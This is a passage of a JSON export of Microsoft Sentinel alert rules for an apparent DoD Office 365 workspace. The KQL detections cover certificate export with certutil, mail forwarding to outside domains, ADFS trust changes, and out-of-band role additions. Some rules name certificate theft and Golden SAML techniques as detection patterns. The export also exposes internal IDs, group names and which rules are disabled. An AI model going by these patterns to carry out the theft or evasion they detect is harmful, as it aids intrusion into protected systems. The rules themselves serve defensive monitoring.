Modified","enabled":false,"description":"","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:28:28.8457592Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d48ec1f2-c79f-4dbe-955e-ea01dd9bb2ab","name":"d48ec1f2-c79f-4dbe-955e-ea01dd9bb2ab","etag":"\"17003780-0000-2700-0000-63c81e960000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"OfficeActivity\r\n| where Operation contains \"SafeLinks\"\r\n| extend Actor = UserId\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":[],"displayName":"DoD365-J - SafeLink Policy Modified","enabled":false,"description":"Detect SafeLink policy modification","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:30:14.5045795Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/bb351322-f8bc-463f-b7e2-8c6a9d40beb1","name":"bb351322-f8bc-463f-b7e2-8c6a9d40beb1","etag":"\"1700ee4a-0000-2700-0000-63c819290000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SecurityEvent\n| where EventSourceName matches regex \"AD FS Auditing\" and EventID == 4890\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DoD365-J - ADFS  certificate manager settings for Certificate Services changed","enabled":false,"description":"The certificate manager settings for Certificate Services changed. Monitoring for this eventID is recommended by Microsoft https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:07:05.4934924Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/55d9468b-f944-4a0e-a007-b3f5b279a08c","name":"55d9468b-f944-4a0e-a007-b3f5b279a08c","etag":"\"160002d6-0000-2700-0000-63c80d930000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT2H","queryPeriod":"PT2H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AuditLogs\n| where OperationName == \"Add member to role\" or  OperationName == \"Add member to role completed (PIM activation)\"\n| where Identity != \"MS-PIM-Fairfax\" and Identity != \"Azure AD PIM\"","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"ActivityDisplayName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":[],"displayName":"DoD365-J - Add Member to Role Out of Band (Non-PIM)","enabled":false,"description":"","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:17:39.0731504Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/7cf59e77-9733-4745-a721-d5fc0b0775ce","name":"7cf59e77-9733-4745-a721-d5fc0b0775ce","etag":"\"1700fd92-0000-2700-0000-63c820b50000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let opValues = dynamic([\"Microsoft.SecurityInsights/alertRules/write\", \"Microsoft.SecurityInsights/alertRules/delete\"]);\n// Azure Sentinel Data Connectors Update / Delete\nAzureActivity\n| where Category == \"Administrative\"\n| where OperationName in (opValues)\n| where ActivityStatus == \"Succeeded\"\n| sort by TimeGenerated desc\n| extend AccountCustomEntity = Caller\n| extend IPCustomEntity = CallerIpAddress\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"OperationName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CallerIpAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":[],"displayName":"DoD365-J - Azure Sentinel Rules Write or Delete","enabled":false,"description":"","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:39:17.4187073Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/741c168d-4e77-4dcd-ba6c-8d563fccd7aa","name":"741c168d-4e77-4dcd-ba6c-8d563fccd7aa","etag":"\"17003237-0000-2700-0000-63c817780000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"SecurityEvent\n| where EventID == 4688 and CommandLine contains \"certutil.exe -exportPFX\"\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","Exfiltration"],"techniques":[],"displayName":"DoD365-J - CMD certificate export for Cloud Infrastructure","enabled":false,"description":"Command line auditing tools used to export certificates. The extraction of a certificate is often part of attempts by attackers to subvert federated security setups and this event should be very carefully examined.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:59:52.0482826Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4118c5cd-1c06-4ab4-a096-87a4d9b1ae0e","name":"4118c5cd-1c06-4ab4-a096-87a4d9b1ae0e","etag":"\"1700a949-0000-2700-0000-63c8190e0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"OfficeActivity\r\n| where RecordType has \"ExchangeAdmin\" and Operation has \"Set-Mailbox\" and Parameters has \"ForwardingSmtpAddress\"\r\n| extend Value_ = tostring(parse_json(Parameters)[1].Value)\r\n| extend Value_2 = tostring(parse_json(Parameters)[2].Value)\r\n| where Value_ !has \".mil\" and Value_ !has \".gov\" and Value_ !has \"usna.edu\" and Value_ !has \"nps.edu\" and Value_ !has \"usnwc.edu\" and Value_ !has \"dliflc.edu\" and Value_ !has \"cfe-dmha.org\" and Value_2 !has \".mil\" and Value_2 !has \".gov\" and Value_2 !has \"usna.edu\" and Value_2 !has \"nps.edu\" and Value_2 !has \"usnwc.edu\" and Value_2 !has \"dliflc.edu\" and Value_2 !has \"cfe-dmha.org\" and isnotempty(Value_) and isnotempty(Value_2)\r\n//and Value_ !has \"nexweb.org\" and Value_2 !has \"nexweb.org\"\r\n| sort by TimeGenerated desc\r\n| project TimeGenerated, UserId, Value_, Operation","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Value_"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Operation"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration"],"techniques":[],"displayName":"DoD365-J - SMTPForwardingAddress Set to Non-DOD Domain Detected","enabled":false,"description":"","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:06:38.7051603Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/2287a1d0-6729-4f92-b18c-c3c828a597de","name":"2287a1d0-6729-4f92-b18c-c3c828a597de","etag":"\"17008242-0000-2700-0000-63c8189c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"OfficeActivity\n//| where TimeGenerated < ago(0d)\n| where Operation == 'New-InboxRule'\n| extend details = parse_json(Parameters)\n| where details has 'ForwardTo' or details contains 'RedirectTo'\n| where details !has \".mil\" and details !has \".gov\" and details !has \"usna.edu\" and details !has \"nps.edu\" and details !has \"usnwc.edu\" and details !has \"dliflc.edu\"\n| extend ForwardTo = iif(details[0].Name contains 'ForwardTo', details[0].Value,\n    iif(details[1].Name contains 'ForwardTo', details[1].Value, \n    iif(details[2].Name contains 'ForwardTo', details[2].Value,  \n    iif(details[3].Name contains 'ForwardTo', details[3].Value, \n    iif(details[4].Name contains 'ForwardTo', details[4].Value,\n    'Check Parameters')))))\n| extend RedirectTo = iif(details[0].Name contains 'RedirectTo', details[0].Value,\n    iif(details[1].Name contains 'RedirectTo', details[1].Value,\n    iif(details[2].Name contains 'RedirectTo', details[2].Value,\n    iif(details[3].Name contains 'RedirectTo', details[3].Value,\n    iif(details[4].Name contains 'RedirectTo', details[4].Value,\n    'Check Parameters')))))\n| extend RuleName = iif(details[3].Name contains 'Name', details[3].Value,\n    iif(details[4].Name contains 'Name', details[4].Value,\n    iif(details[5].Name contains 'Name', details[5].Value,\n    'Check Parameters')))\n| extend RuleParameters = iif(details[2].Name != 'ForwardTo' and details[2].Name != 'RedirectTo', \n    strcat(tostring(details[2].Name), '-', tostring(details[2].Value)),\n    iif(details[3].Name != 'ForwardTo' and details[3].Name != 'RedirectTo' and details[3].Name != 'Name',\n    strcat(tostring(details[3].Name), '-', tostring(details[3].Value)), \n    iff(details[4].Name != 'ForwardTo' and details[4].Name != 'RedirectTo' and details[4].Name != 'Name' and details[4].Name != 'StopProcessingRules',\n    strcat(tostring(details[4].Name), '-', tostring(details[4].Value)),\n    'All Mail')))\n| project\n    TimeGenerated,\n    Operation,\n    RuleName,\n    RuleParameters,\n    iif(details contains 'ForwardTo', ForwardTo, RedirectTo),\n    ClientIP,\n    UserId\n| sort by TimeGenerated desc\n| project-rename Email_Forwarded_To = Column1, Creating_User = UserId\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Creating_User"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Email_Forwarded_To"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"RuleName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration"],"techniques":[],"displayName":"DoD365-J - Forwarding Rule to Non-Mil Domain Detected","enabled":false,"description":"","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:04:44.7876163Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/63537ab4-7db0-437f-963c-f37de668df45","name":"63537ab4-7db0-437f-963c-f37de668df45","etag":"\"17001b89-0000-2700-0000-63c81f8c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let timeframe = 1d;\n// Adjust for a longer timeframe for identifying ADFS Servers\nlet lookback = 6d;\n// Identify ADFS Servers\nlet ADFS_Servers = (\n    union\n        SecurityEvent\n    | where TimeGenerated > ago(timeframe + lookback)\n    | where EventID == 4688 and SubjectLogonId != \"0x3e4\"\n    | where ProcessName has \"Microsoft.IdentityServer.ServiceHost.exe\"\n    | distinct Computer\n    );\nunion\n    SecurityEvent\n| where TimeGenerated > ago(timeframe)\n| where Computer in~ (ADFS_Servers)\n| where Account !endswith \"$\"\n// Check for scheduled task events\n| where EventID in (4697, 4698, 4699, 4700, 4701, 4702)\n| extend EventDataParsed = parse_xml(EventData)\n| extend SubjectLogonId = tostring(EventDataParsed.EventData.Data[3][\"#text\"])\n// Check specifically for access to IPC$ share and PIPE\\svcctl and PIPE\\atsvc for Service Control Services and Schedule Control Services\n| union ( \n    SecurityEvent\n    | where TimeGenerated > ago(timeframe)\n    | where Computer in~ (ADFS_Servers)\n    | where Account !endswith \"$\"\n    | where EventID == 5145\n    | where RelativeTargetName =~ \"svcctl\" or RelativeTargetName =~ \"atsvc\"\n    )\n// Check for lateral movement\n| join kind=inner\n    (union\nSecurityEvent\n    | where TimeGenerated > ago(timeframe)\n    | where Account !endswith \"$\"\n    | where EventID == 4624 and LogonType == 3\n    )\n    on $left.SubjectLogonId == $right.TargetLogonId\n| project TimeGenerated, Account, Computer, EventID, RelativeTargetName\n| extend\n    timestamp = TimeGenerated,\n    HostCustomEntity = Computer,\n    AccountCustomEntity = Account\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Account"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"Computer"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["LateralMovement"],"techniques":[],"displayName":"DoD365-J - SMB/Remote Code Execution on ADFS Server","enabled":false,"description":"This query detects instances where an attacker has gained the ability to execute code on an ADFS Server through SMB and Remote Service or Scheduled Task.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:34:19.9472508Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/7bdb01b0-78a6-4e5b-af44-65e2ea893efd","name":"7bdb01b0-78a6-4e5b-af44-65e2ea893efd","etag":"\"17004d58-0000-2700-0000-63c81a7b0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SecurityEvent \n| where EventSourceName matches regex \"AD FS Auditing\" and EventID == 4719\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":[],"displayName":"DoD365-J - ADFS System audit policy was changed.","enabled":false,"description":"System audit policy was changed. Monitoring for this eventID is recommended by Microsoft https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:12:43.0811816Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/aa8ee8fe-64ff-4dfd-b36f-757caa1501da","name":"aa8ee8fe-64ff-4dfd-b36f-757caa1501da","etag":"\"160066db-0000-2700-0000-63c80e3b0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AuditLogs\r\n| where TargetResources[1].id == \"914b4ff8-1750-4e61-bdc0-10d8d9690d76\"\r\n| project TimeGenerated, ActivityDisplayName, GroupName = parse_json(tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[1].newValue)), InitiatedBy = parse_json(tostring(InitiatedBy.user)).userPrincipalName, TargetUser = TargetResources[0].userPrincipalName","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DoD365-J - Add/Remove to RG-Level 2 MDE T3 Analysts","enabled":false,"description":"Changes made to RG-Azure Admin - CSSP Admin.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:20:27.8742232Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ddd453a0-ae22-4048-9668-710fc6169e3a","name":"ddd453a0-ae22-4048-9668-710fc6169e3a","etag":"\"1700f663-0000-2700-0000-63c81bb30000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SecurityEvent\n| where EventSourceName matches regex \"AD FS Auditing\"\n    and EventID == 510\n    and EventData contains \"Configuration: Type: IssuanceAuthority\"\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","PrivilegeEscalation"],"techniques":[],"displayName":"DoD365-J - Potential new ADFS added","enabled":false,"description":"An attacker gaining administrative access to ADFS may, instead of extracting the certificate and private key for a standard Golden SAML attack, add a new trusted ADFS. This approach will enable them to sign valid SAML responses and gain persistent access to resources, while evading detection. This attack can be detected by monitoring the creation of new ADFS trust, which this event may correspond to. It also may be benign and authorized change.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:17:55.5747145Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/a0564011-7907-479b-a981-6076c4d51633","name":"a0564011-7907-479b-a981-6076c4d51633","etag":"\"17009b38-0000-2700-0000-63c817940000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT30M","queryPeriod":"PT30M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let timeRange = 30m;\nlet threshold = 25;\nSigninLogs\n| where TimeGenerated >= ago(timeRange)\n| where ResultDescription contains \"Account is locked\"\n| summarize\n    StartTime = min(TimeGenerated),\n    EndTime = max(TimeGenerated),\n    IPAddress = make_set(IPAddress),\n    IPAddressCount = dcount(IPAddress),\n    AppDisplayName = make_set(AppDisplayName),\n    LockoutCount = count()\n    by UserDisplayName\n| where LockoutCount > threshold\n| extend tostring(IPAddress), tostring(AppDisplayName)\n| distinct *\n| extend\n    timestamp = StartTime,\n    AccountCustomEntity = UserDisplayName,\n    IPCustomEntity = IPAddress\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"DoD365-J - Mass Lockout Event Detected","enabled":false,"description":"","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:00:20.7961169Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/59a21e3f-731a-4482-8806-ef34b2661375","name":"59a21e3f-731a-4482-8806-ef34b2661375","etag":"\"17001a20-0000-2700-0000-63c815080000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"SigninLogs\n| where AppId in (\"1b730954-1685-4b74-9bfd-dac224a7b894\", \"1950a258-227b-4e31-a9cf-717495945fc2\", \"fb78d390-0c51-40cd-8e17-fdbfab77341b\", \"9bc3ab49-b65d-410a-85ad-de819febfddc\", \"12128f48-ec9e-42f0-b203-ea49fb6af367\")\n| join kind=inner (IdentityInfo) on $left.UserId == $right.AccountObjectId\n| where GroupMembership !has \"NNWC Authorized PowerShell Users\" and UserPrincipalName !has \"@us.navy.mil\"\n| summarize arg_max(TimeGenerated, *) by CorrelationId\n| project\n    TimeGenerated,\n    UserPrincipalName,\n    AppDisplayName,\n    IPAddress,\n    ConditionalAccessStatus\n| sort by TimeGenerated desc\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"Selected","groupByEntities":["Account"],"groupByAlertDetails":["DisplayName"],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AppDisplayName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"ConditionalAccessStatus"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","CredentialAccess"],"techniques":[],"displayName":"DoD365-J - ADMIN Powershell Sign-ins not authorized","enabled":false,"description":"Detects PowerShell sign-ins from any admin that is not authorized for powershell use.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T15:49:28.8493392Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/c90c1e43-3c01-4368-8a25-7e5e6de66dd4","name":"c90c1e43-3c01-4368-8a25-7e5e6de66dd4","etag":"\"1700f740-0000-2700-0000-63c8186d0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AuditLogs \r\n| where TargetResources[1].id in (\r\n    \"691f664c-a3c0-480d-b35b-a85b6c1854d2\", // RG-Azure Admin - CSSP Responder\r\n    \"5a390162-a528-45c2-9499-9a8e2a18f6e7\", // RG-Azure Admin - CSSP Contributor\r\n    \"cde2267a-071c-4798-826f-e184ed7f4260\"  // RG-Azure Admin - CSSP Admin\r\n    )\r\n| sort by TimeGenerated desc nulls last \r\n| project TimeGenerated, ActivityDisplayName, Result, GroupName = parse_json(tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[1].newValue)), UserInitiated = parse_json(tostring(InitiatedBy.user)).userPrincipalName, TargetUser = TargetResources[0].userPrincipalName","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetUser"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"GroupName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserInitiated"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DoD365-J - Sentinel Group Modification Alert (policy)","enabled":true,"description":"Changes to RG-Azure Admin - CSSP, Contrib, Responder Groups.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:03:57.1916978Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/41fc1b40-b2bd-4ded-a3b1-da2ed48b6cc2","name":"41fc1b40-b2bd-4ded-a3b1-da2ed48b6cc2","etag":"\"1700998f-0000-2700-0000-63c820590000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"AuditLogs\n| where ActivityDisplayName contains \"Add app\"\n| extend userPrincipalName_ = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n| extend displayName_ = tostring(TargetResources[0].displayName)\n| extend TimeGenerated\n| project displayName_, userPrincipalName_, TimeGenerated\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":[],"displayName":"DoD365-J - Application Added to Azure AD","enabled":false,"description":"Detect additions of new applications to Azure AD","alertRuleTemplateName":null,"lastModifiedUtc":"2023-01-18T16:37:45.6435076Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/a8ee73b7-88b6-48fb-889a-71de72b1f86e","name":"a8ee73b7-88b6-48fb-889a-71de72b1f86e","etag":"\"0a01f0a3-0000-2700-0000-664e0dfd0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AuditLogs \n| where TargetResources[1].id in (\n    \"8a392d5d-9ebb-4bf0-8848-bc17959c2978\", // RG-Level 2 MDE Global T1 Analysts\n    \"878bbd6c-71ca-41f5-a45c-489d6acf5367\", // RG-Level 2 MDE Global T2 Analysts\n    \"914b4ff8-1750-4e61-bdc0-10d8d9690d76\", // RG-Level 2 MDE T3 Analysts\n    \"914b4ff8-1750-4e61-bdc0-10d8d9690d76\"  // RG-Level 2 MDE Global Security Managers\n    )\n| where parse_json(tostring(InitiatedBy.app)).displayName <> \"MS-PIM-Fairfax\"\n| sort by TimeGenerated desc nulls last \n| project TimeGenerated, ActivityDisplayName, GroupName = parse_json(tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[1].newValue)), UserInitiated = 